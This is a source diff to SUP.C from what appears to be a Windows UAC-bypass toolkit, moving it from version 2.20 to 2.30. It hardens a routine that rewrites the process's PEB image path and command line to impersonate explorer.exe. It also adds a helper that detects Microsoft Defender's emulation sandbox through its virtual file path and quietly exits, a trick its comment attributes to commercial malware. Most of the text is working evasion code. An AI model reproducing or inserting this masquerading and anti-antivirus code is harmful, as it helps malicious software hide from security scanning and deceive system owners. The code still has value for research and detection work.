@@ -4,9 +4,9 @@
 *
 *  TITLE:       SUP.C
 *
-*  VERSION:     2.20
+*  VERSION:     2.30
 *
-*  DATE:        25 May 2016
+*  DATE:        17 June 2016
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -505,23 +505,30 @@ VOID supMasqueradeProcess(
 {
     SIZE_T  sz = 0x1000;
     PPEB    Peb = g_ctx.Peb;
+    DWORD   cch;
     WCHAR   szBuffer[MAX_PATH + 1];
 
     RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-    GetWindowsDirectory(szBuffer, MAX_PATH);
-    _strcat(szBuffer, L"\\explorer.exe");
+    cch = GetWindowsDirectory(szBuffer, MAX_PATH);
+    if ((cch != 0) && (cch < MAX_PATH)) {
 
-    NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    _strcpy(g_lpszExplorer, szBuffer);
+        _strcat(szBuffer, L"\\explorer.exe");
 
-    RtlEnterCriticalSection(Peb->FastPebLock);
+        g_lpszExplorer = NULL;
+        NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (g_lpszExplorer) {
+            _strcpy(g_lpszExplorer, szBuffer);
 
-    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
-    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, APPCMDLINE);
+            RtlEnterCriticalSection(Peb->FastPebLock);
 
-    RtlLeaveCriticalSection(Peb->FastPebLock);
+            RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
+            RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, APPCMDLINE);
 
-    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
+            RtlLeaveCriticalSection(Peb->FastPebLock);
+
+            LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
+        }
+    }
 }
 
 /*
@@ -567,5 +574,77 @@ DWORD supExpandEnvironmentStrings(
     else {
         RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
         return 0;
+    }
+}
+
+/*
+* supScanFiles
+*
+* Purpose:
+*
+* Find files of the given type and run callback over them.
+*
+*/
+BOOL supScanFiles(
+    _In_ LPWSTR lpDirectory,
+    _In_ LPWSTR lpFileType,
+    _In_ UCM_FIND_FILE_CALLBACK Callback
+    )
+{
+    BOOL bStopEnumeration = FALSE;
+    HANDLE hFile;
+    WCHAR textbuf[MAX_PATH * 2];
+    WIN32_FIND_DATA fdata;
+
+    if ((Callback == NULL) || (lpDirectory == NULL) || (lpFileType == NULL))
+        return FALSE;
+
+    RtlSecureZeroMemory(textbuf, sizeof(textbuf));
+
+    _strncpy(textbuf, MAX_PATH, lpDirectory, MAX_PATH);
+    _strcat(textbuf, L"\\");
+    _strncpy(_strend(textbuf), 20, lpFileType, 20);
+
+    RtlSecureZeroMemory(&fdata, sizeof(fdata));
+    hFile = FindFirstFile(textbuf, &fdata);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        do {
+
+            bStopEnumeration = Callback(&fdata, lpDirectory);
+            if (bStopEnumeration)
+                break;
+
+        } while (FindNextFile(hFile, &fdata));
+        FindClose(hFile);
+    }
+    return bStopEnumeration;
+}
+
+/*
+* supCheckMSEngineVFS
+*
+* Purpose:
+*
+* Detect Microsoft Security Engine emulation by it own VFS artefact.
+*
+* Microsoft AV provides special emulated environment for scanned application where it
+* fakes general system information, process environment structures/data to make sure 
+* API calls are transparent for scanned code. It also use simple Virtual File System 
+* allowing this AV track file system changes and if needed continue emulation on new target.
+*
+* This method implemented in commercial malware presumable since 2013.
+*
+*/
+VOID supCheckMSEngineVFS(
+    VOID
+    )
+{
+    WCHAR szBuffer[MAX_PATH];
+    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };
+
+    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+    GetModuleFileName(NULL, szBuffer, MAX_PATH);
+    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
+        ExitProcess((UINT)0);
     }
 }
